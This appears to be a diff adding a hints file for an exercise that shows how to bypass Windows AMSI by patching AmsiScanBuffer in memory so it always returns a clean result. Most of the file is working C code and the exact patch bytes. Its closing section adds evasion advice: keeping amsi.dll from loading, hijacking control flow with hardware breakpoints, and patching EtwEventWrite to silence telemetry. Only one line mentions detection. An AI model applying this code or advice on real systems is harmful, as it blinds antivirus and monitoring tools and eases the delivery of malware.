@@ -1,0 +1,25 @@
+=== HINT 1: Load AMSI and get function ===
+HMODULE amsi = LoadLibraryA("amsi.dll");
+BYTE *fn = (BYTE*)GetProcAddress(amsi, "AmsiScanBuffer");
+
+=== HINT 2: Unlock and patch ===
+DWORD old = 0;
+VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
+memcpy(fn, patch, sizeof(patch));
+VirtualProtect(fn, sizeof(patch), old, &old);
+
+=== HINT 3: Verify ===
+print_bytes("after patch:", fn, 8);
+// Should show: B8 01 00 00 00 C3 ...
+
+=== KEY INSIGHT ===
+The patch bytes: B8 01 00 00 00 C3
+  = mov eax, 1    (AMSI_RESULT_CLEAN)
+  = ret
+AmsiScanBuffer callers check if result == AMSI_RESULT_DETECTED; patched version
+always returns CLEAN so the caller skips blocking.
+Detection: CRC/hash integrity checks on amsi.dll in memory (Defender, CrowdStrike).
+Better evasion: force amsi.dll to not load at all (patch CLR before it loads AMSI),
+  or use hardware breakpoints on AmsiScanBuffer to hijack control flow without
+  modifying bytes (no memory-write IOC).
+ETW bypass: similar patch on EtwEventWrite in ntdll.dll to silence telemetry.
